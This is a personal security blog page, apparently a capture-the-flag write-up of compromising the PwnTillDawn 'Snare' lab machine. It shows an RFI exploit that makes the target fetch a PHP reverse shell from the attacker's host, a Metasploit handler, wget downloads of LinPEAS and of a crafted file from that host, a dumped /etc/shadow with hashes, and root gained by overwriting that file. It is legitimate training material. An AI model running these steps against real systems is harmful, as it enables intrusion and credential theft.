@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>Lets Talk Security</title>
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <meta content="Elliot Jamhuri Nkwama" name="keywords">
+        <meta content="Elliot Nkwama" name="keywords">
+        <meta content="elliot-hacks" name="keywords">
+        <meta content="Hackthebox" name="keywords">
+        <meta content="tryhackme" name="keywords">
+        <meta content="Active Directory" name="keywords">
+        <meta content="Reverse Engineering" name="keywords">
+        <meta content="Cryptography" name="keywords">
+        <meta content="Binary Exploitation" name="keywords">
+        <meta content="Writeups" name="keywords">
+        <meta content="OSINT" name="keywords">
+        <meta content="Forensics" name="keywords">
+        <meta content="Android Penetration Testing" name="keywords">
+        <meta content="Miscelenious" name="keywords">
+        <meta content="Cyber Security blog" name="description">
+
+        <!-- Favicon -->
+        <link href="img/favicon.ico" rel="icon">
+
+        <!-- Google Web Fonts -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+        <!-- Icon Font Stylesheet -->
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+
+        <!-- Libraries Stylesheet -->
+        <link href="/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+        <link href="/lib/lightbox/css/lightbox.min.css" rel="stylesheet">
+        <link href="/lib/animate/animate.min.css" rel="stylesheet">
+
+        <!-- Customized Bootstrap Stylesheet -->
+        <link href="/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Template Stylesheet -->
+        <link href="/css/style.css" rel="stylesheet">
+    </head>
+
+    <body style="margin: 0; font-family: Arial, sans-serif;">
+            <!-- Navigation Header -->
+            <header style="background-color: #333; color: white; padding: 15px 20px; position: sticky; top: 0; z-index: 1000; display: flex; justify-content: space-between; align-items: center;">
+                <a href="/" style="font-size: 24px; font-weight: bold; color: white; text-decoration: none;">@elliot-hacks</a>
+                <nav id="navMenu" style="display: flex; gap: 20px;">
+                    <a href="/" style="color: white; text-decoration: none; font-size: 16px;">Home</a>
+                    <a href="#about" style="color: white; text-decoration: none; font-size: 16px;">About</a>
+                    <a href="#blog" style="color: white; text-decoration: none; font-size: 16px;">Blog</a>
+                    <a href="#contact" style="color: white; text-decoration: none; font-size: 16px;">Contact</a>
+                </nav>
+                <div id="hamburgerMenu" style="font-size: 24px; cursor: pointer; display: none;">☰</div>
+            </header>
+        
+            <!-- Content Placeholder -->
+            <main style="padding: 20px; position: sticky; top: 0">
+                <h1>Welcome to My Blog</h1>
+                <p>Let's talk Security!</p>
+            </main>
+
+        <div class="container">
+            <div class="row g-5">
+                <div class="col-lg-4 sticky-lg-top vh-100">
+                    <div class="d-flex flex-column h-100 text-center overflow-auto shadow">
+                        <img class="w-100 img-fluid mb-4" src="/img/elliot-hacks.jpg" style="height: 400px;" alt="Image">
+                        <h1 class="text-primary mt-2">Elliot Jamhuri Nkwama</h1>
+                        <div class="mb-4" style="height: 22px;">
+                            <h4 class="typed-text-output d-inline-block text-light"></h4>
+                            <div class="typed-text d-none">Penetration Tester, Web Developer, Android Developer, System Archtecture</div>
+                        </div>
+                        <div class="d-flex justify-content-center mt-auto mb-3">
+                            <a class="btn btn-secondary btn-square mx-1" href="https://twitter.com/elliotH4cks"><i class="fab fa-twitter"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://facebook.com/thisguyhack"><i class="fab fa-facebook-f"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://linkedin.com/in/elliot-hacks"><i class="fab fa-linkedin-in"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://instagram.com/elliot.nkwama"><i class="fab fa-instagram"></i></a>
+                        </div>
+                        <div class="d-flex align-items-end justify-content-between border-top">
+                            <a href="" class="btn w-50 border-end">Download CV</a>
+                            <a href="#contact" class="btn w-50 btn-scroll">Contact Me</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-8">
+                    <!-- About Start -->
+                    <section class="py-5 border-bottom wow fadeInUp" data-wow-delay="0.1s">
+                        <h1 class="title pb-3 mb-5">Blue Pawntilldawn</h1>
+                        <div class="row mb-4">
+                            <article>
+                                <h2 id="pwntilldawn-snare-machine-writeup">PwnTillDawn - Snare Machine Writeup</h2>
+                                <p>This writeup details the steps I took to exploit and escalate privileges on the <strong>Snare</strong> machine.</p>
+                                <hr>
+                                <h3 id="-key-takeaways-"><strong>Key Takeaways</strong></h3>
+                                <ol>
+                                <li>Review web application configurations to exploit parameter manipulation vulnerabilities like RFI.</li>
+                                <li>Check sensitive files such as <code>/etc/shadow</code> for their permissions.</li>
+                                <li>Use automated tools like LinPEAS to quickly identify misconfigurations and exploit.</li>
+                                </ol>
+                                <hr>
+                                <h3 id="-step-1-initial-reconnaissance-"><strong>Step 1: Initial Reconnaissance</strong></h3>
+                                <p>Using <strong>db_nmap</strong>, I performed a service scan on the target machine:</p>
+                                <pre>
+                                    <code>
+[msf](Jobs:0 Agents:1) >> db_nmap 10.150.150.18
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 23:22 EAT
+[*] Nmap: Nmap scan report for 10.150.150.18
+[*] Nmap: Host is up (0.40s latency).
+[*] Nmap: Not shown: 998 closed tcp ports (reset)
+[*] Nmap: PORT   STATE SERVICE
+[*] Nmap: 22/tcp open  ssh
+[*] Nmap: 80/tcp open  http
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 32.07 seconds
+
+
+[msf](Jobs:0 Agents:1) >> db_nmap -sV -sC -p22,80 10.150.150.18
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 23:23 EAT
+[*] Nmap: Nmap scan report for 10.150.150.18
+[*] Nmap: Host is up (0.47s latency).
+[*] Nmap: PORT   STATE SERVICE VERSION
+[*] Nmap: 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+[*] Nmap: | ssh-hostkey:
+[*] Nmap: |   3072 2f:0e:73:d4:ae:73:14:7e:c5:1c:15:84:ef:45:a4:d1 (RSA)
+[*] Nmap: |   256 39:0b:0b:c9:86:c9:8e:b5:2b:0c:39:c7:63:ec:e2:10 (ECDSA)
+[*] Nmap: |_  256 f6:bf:c5:03:5b:df:e5:e1:f4:da:ac:1e:b2:07:88:2f (ED25519)
+[*] Nmap: 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+[*] Nmap: | http-title: Welcome to my homepage!
+[*] Nmap: |_Requested resource was /index.php?page=home
+[*] Nmap: |_http-server-header: Apache/2.4.41 (Ubuntu)
+[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 22.21 seconds
+                                    </code>
+                                </pre>
+                                <ul>
+                                <li>Open ports: <strong>22 (SSH)</strong> and <strong>80 (HTTP)</strong></li>
+                                <li>The HTTP service revealed an index page with a parameterized <code>page</code> query string.</li>
+                                </ul>
+                                <hr>
+                                <h3 id="-step-2-exploiting-remote-file-inclusion-rfi-"><strong>Step 2: Exploiting Remote File Inclusion (RFI)</strong></h3>
+                                <p>I tested for <strong>Remote File Inclusion (RFI)</strong> and successfully executed a reverse shell by hosting a malicious PHP file on my local server:</p>
+                                <p><img src="snare_home.png" alt=""></p>
+                                <h4 id="preparing-the-exploit">Preparing the Exploit</h4>
+                                <ol>
+                                <li><p>Modified a PHP reverse shell from <strong>Pentest Monkey</strong> to include my attacker&#39;s IP (<code>10.66.66.134</code>) and port (<code>8000</code>).</p>
+                                </li>
+                                <li><p>Hosted the exploit file using a Python HTTP server:</p>
+                                <pre><code class="lang-bash"> python -m http.<span class="hljs-keyword">server</span>
+                                </code></pre>
+                                </li>
+                                <li><p>Triggered the RFI vulnerability:</p>
+                                <pre><code class="lang-bash"> curl 'http://<span class="hljs-number">10.150.150.18</span>/index.php?page=http://<span class="hljs-number">10.66.66.134:8000</span>/exploit'
+                                </code></pre>
+                                </li>
+                                <li><p>Set up a Metasploit multi-handler to catch the shell:</p>
+                                <pre><code class="lang-bash"> [<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) &gt;&gt; use exploit/multi/handler
+                                [<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) exploit(multi/handler) &gt;&gt; set LHOST 10.66.66.134
+                                [<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:1</span>) exploit(multi/handler) &gt;&gt; run
+                                </code></pre>
+                                </li>
+                                </ol>
+                                <pre>
+                                    <code>
+[msf](Jobs:0 Agents:1) >> search multi/handler
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
+   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
+   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
+   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
+   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
+
+
+Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence
+
+[msf](Jobs:0 Agents:1) >> use 5
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set LHOST 10.66.66.134
+LHOST => 10.66.66.134
+[msf](Jobs:0 Agents:1) exploit(multi/handler) >> options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.66.66.134     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+[msf](Jobs:0 Agents:1) exploit(multi/handler) >> run
+
+[*] Started reverse TCP handler on 10.66.66.134:4444 
+[*] Command shell session 7 opened (10.66.66.134:4444 -> 10.150.150.18:45170) at 2024-09-01 23:35:56 +0300
+
+
+Shell Banner:
+Linux snare 5.4.0-53-generic #59-Ubuntu SMP Wed Oct 21 09:38:44 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 17:35:42 up 40 min,  2 users,  load average: 0.00, 0.00, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     tty1     -                17Dec20 946days  0.06s  0.04s -bash
+root     pts/0    10.66.66.38      27Nov20 1373days  0.02s  0.02s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+$ python3 --version
+Python 3.8.5
+$ python3 -c "import pty;pty.spawn('/bin/sh')"
+$ bash
+bash
+www-data@snare:/$ ls
+ls
+bin    dev   lib    libx32	mnt   root  snap      sys  var
+boot   etc   lib32  lost+found	opt   run   srv       tmp
+cdrom  home  lib64  media	proc  sbin  swap.img  usr
+www-data@snare:/$ cd /home	
+cd /home
+www-data@snare:/home$ ls
+ls
+snare
+www-data@snare:/home$ cd snare
+cd snare
+www-data@snare:/home/snare$ ls
+ls
+FLAG1.txt
+                                        [ REDUCTED ]
+                                    </code>
+                                </pre>
+                                <hr>
+                                <h3 id="-step-3-privilege-escalation-"><strong>Step 3: Privilege Escalation</strong></h3>
+                                <p>To escalate privileges, I used <strong>LinPEAS</strong> to enumerate potential vulnerabilities:</p>
+                                <h4 id="hosting-linpeas">Hosting LinPEAS</h4>
+                                <ol>
+                                <li><p>Hosted the script using Python HTTP server:</p>
+                                <pre><code class="lang-bash"> python -m http.<span class="hljs-keyword">server</span>
+                                </code></pre>
+                                </li>
+                                <li><p>Downloaded the script on the target machine:</p>
+                                <pre><code class="lang-bash"> wget http:<span class="hljs-comment">//10.66.66.134:8000/linpeas.sh</span>
+                                chmod +x linpeas.<span class="hljs-keyword">sh</span>
+                                ./linpeas.<span class="hljs-keyword">sh</span>
+                                </code></pre>
+                                </li>
+                                </ol>
+                                <h4 id="key-finding-">Key Finding:</h4>
+                                <p>The <code>/etc/shadow</code> file was world-writable:</p>
+                                <p>```bash
+                                www-data@snare:/tmp$ ls -alh /etc/shadow
+                                -rwxrwxrwx 1 root shadow 1.2K Nov 20  2020 /etc/shadow</p>
+                                <pre>
+                                    <code>
+www-data@snare:/home/snare$ cd /tmp
+cd /tmp
+www-data@snare:/tmp$ wget http://10.66.66.134:8000/linpeas.sh
+wget http://10.66.66.134:8000/linpeas.sh
+--2024-09-01 17:39:35--  http://10.66.66.134:8000/linpeas.sh
+Connecting to 10.66.66.134:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 823052 (804K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 803.76K  15.3KB/s    in 75s     
+
+2024-09-01 17:40:51 (10.7 KB/s) - ‘linpeas.sh’ saved [823052/823052]
+
+
+
+www-data@snare:/tmp$ ls -alh /etc/shadow
+ls -alh /etc/shadow
+-rwxrwxrwx 1 root shadow 1.2K Nov 20  2020 /etc/shadow
+www-data@snare:/tmp$ cat /etc/shadow
+cat /etc/shadow
+root:$6$b8wkwLbICzuTqPiO$dFLYb8ZNEpfGLRnvODlyGfjtZQTV85FJCDCBGiZEU9b3laym9RJo144xkYEldB419O1Q3E5FARrKRRn/LrtZc0:18586:0:99999:7:::
+daemon:*:18474:0:99999:7:::
+bin:*:18474:0:99999:7:::
+sys:*:18474:0:99999:7:::
+sync:*:18474:0:99999:7:::
+games:*:18474:0:99999:7:::
+man:*:18474:0:99999:7:::
+lp:*:18474:0:99999:7:::
+mail:*:18474:0:99999:7:::
+news:*:18474:0:99999:7:::
+uucp:*:18474:0:99999:7:::
+proxy:*:18474:0:99999:7:::
+www-data:*:18474:0:99999:7:::
+backup:*:18474:0:99999:7:::
+list:*:18474:0:99999:7:::
+irc:*:18474:0:99999:7:::
+gnats:*:18474:0:99999:7:::
+nobody:*:18474:0:99999:7:::
+systemd-network:*:18474:0:99999:7:::
+systemd-resolve:*:18474:0:99999:7:::
+systemd-timesync:*:18474:0:99999:7:::
+messagebus:*:18474:0:99999:7:::
+syslog:*:18474:0:99999:7:::
+_apt:*:18474:0:99999:7:::
+tss:*:18474:0:99999:7:::
+uuidd:*:18474:0:99999:7:::
+tcpdump:*:18474:0:99999:7:::
+landscape:*:18474:0:99999:7:::
+pollinate:*:18474:0:99999:7:::
+sshd:*:18579:0:99999:7:::
+systemd-coredump:!!:18579::::::
+snare:$6$H64MOvr/bVP1M3TM$ITTpmiB7QNgv7EARjOcIMgeBvbCXlDOU5LqjA7q0ivXWhevk7HbatblgH7Yc1y8aUo0pnASOhJgjWRlGMsusu/:18586:0:99999:7:::
+lxd:!:18579::::::
+                                    </code>
+                                </pre>
+                                <hr>
+                                <h4 id="exploiting-writable-shadow-file">Exploiting Writable Shadow File</h4>
+                                <ol>
+                                <li><p>Generated a new password hash for the root user:</p>
+                                <pre><code class="lang-bash"> mkpasswd -m sha<span class="hljs-number">-512</span> elliothacks
+                                $<span class="hljs-number">6</span>$GDyAeq<span class="hljs-number">7</span>lpWUI<span class="hljs-number">04</span>RY$VOEmda<span class="hljs-number">0</span>awSK<span class="hljs-number">5</span>j<span class="hljs-name">M5</span>Gl<span class="hljs-number">3</span>kmWAb.pMtKu<span class="hljs-number">33</span>u<span class="hljs-symbol">NuRsxO112</span>gmOHzyTkFf<span class="hljs-number">53</span>FD<span class="hljs-name">G5</span>pF<span class="hljs-number">9</span>r<span class="hljs-name">M3</span>kwCFY<span class="hljs-symbol">N7</span>WMEMX<span class="hljs-number">4</span>W<span class="hljs-number">1</span>l<span class="hljs-number">9</span>/HbVd/
+                                </code></pre>
+                                </li>
+                                <li><p>Created a modified <code>/etc/shadow</code> file locally with the new root hash.</p>
+                                </li>
+                                <li><p>Uploaded and overwrote the shadow file on the target machine:</p>
+                                <pre><code class="lang-bash"> wget <span class="hljs-string">http:</span><span class="hljs-comment">//10.66.66.134:8000/elly.txt</span>
+                                cat elly.txt &gt; <span class="hljs-regexp">/etc/</span>shadow
+                                </code></pre>
+                                </li>
+                                <li><p>Gained root access:</p>
+                                <pre><code class="lang-bash"> su root
+                                <span class="hljs-symbol"> Password:</span> elliothacks
+                                </code></pre>
+                                </li>
+                                </ol>
+                                <h4 id="verification-">Verification:</h4>
+                                <pre><code class="lang-bash">root<span class="hljs-variable">@snare</span><span class="hljs-symbol">:/root</span><span class="hljs-comment"># ls</span>
+                                FLAG2.txt  snap
+                                </code></pre>
+                                <hr>
+                                <pre>
+                                    <code>
+www-data@snare:/tmp$ wget http://10.66.66.134:8000/elly.txt  
+--2024-09-01 18:24:16--  http://10.66.66.134:8000/elly.txt
+Connecting to 10.66.66.134:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1129 (1.1K) [text/plain]
+Saving to: ‘elly.txt’
+
+elly.txt            100%[===================>]   1.10K  --.-KB/s    in 0.02s   
+
+2024-09-01 18:24:17 (45.0 KB/s) - ‘elly.txt’ saved [1129/1129]
+
+www-data@snare:/tmp$ cat elly.txt>/etc/shadow
+www-data@snare:/tmp$ su root
+Password: elliothacks
+
+root@snare:/tmp# cd /root
+root@snare:~# ls
+FLAG2.txt  snap
+                                    </code>
+                                </pre>
+                                <p><img src="snare.png" alt=""></p>
+                                <p><strong>Snare has been pwned!</strong></p>
+                            </article>
+                        </div>
+                    </section>
+                    <!-- About End -->
+
+                    <!-- Footer Start -->
+                    <section class="wow fadeIn" data-wow-delay="0.1s">
+                        <div class="bg-secondary text-light text-center p-5">
+                            <div class="d-flex justify-content-center mb-4">
+                                <a class="btn btn-dark btn-square mx-1" href="https://twitter.com/elliotH4cks"><i class="fab fa-twitter"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://facebook.com/thisguyhack"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://linkedin.com/in/elliot-hacks"><i class="fab fa-linkedin-in"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://instagram.com/elliot.nkwama"><i class="fab fa-instagram"></i></a>
+                            </div>
+                            <div class="d-flex justify-content-center mb-3">
+                                <a class="text-light px-3 border-end" href="#">Privacy</a>
+                                <a class="text-light px-3 border-end" href="#">Terms</a>
+                                <a class="text-light px-3 border-end" href="#">FAQs</a>
+                                <a class="text-light px-3" href="#">Help</a>
+                            </div>
+							
+                            <!--/*** This template is free as long as you keep the footer author’s credit link/attribution link/backlink. If you'd like to use the template without the footer author’s credit link/attribution link/backlink, you can purchase the Credit Removal License from "https://htmlcodex.com/credit-removal". Thank you for your support. ***/-->
+							<p class="m-0">&copy; All Rights Reserved. <a href="mailto:thisguyhack@gmail.com">elliot-hacks</a></p>
+                        </div>
+                    </section>
+                    <!-- Footer End -->
+                </div>
+            </div>
+        </div>
+
+        
+        <!-- Back to Top -->
+        <a href="#" class="back-to-top"><i class="fa fa-angle-double-up"></i></a>
+        
+        <!-- JavaScript Libraries -->
+        <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
+        <script src="/lib/wow/wow.min.js"></script>
+        <script src="/lib/typed/typed.min.js"></script>
+        <script src="/lib/easing/easing.min.js"></script>
+        <script src="/lib/waypoints/waypoints.min.js"></script>
+        <script src="/lib/counterup/counterup.min.js"></script>
+        <script src="/lib/owlcarousel/owl.carousel.min.js"></script>
+        <script src="/lib/isotope/isotope.pkgd.min.js"></script>
+        <script src="/lib/lightbox/js/lightbox.min.js"></script>
+
+        <!-- Contact Javascript File -->
+        <script src="/mail/jqBootstrapValidation.min.js"></script>
+        <script src="/mail/contact.js"></script>
+
+        <!-- Template Javascript -->
+        <script src="/js/main.js"></script>
+    </body>
+</html>
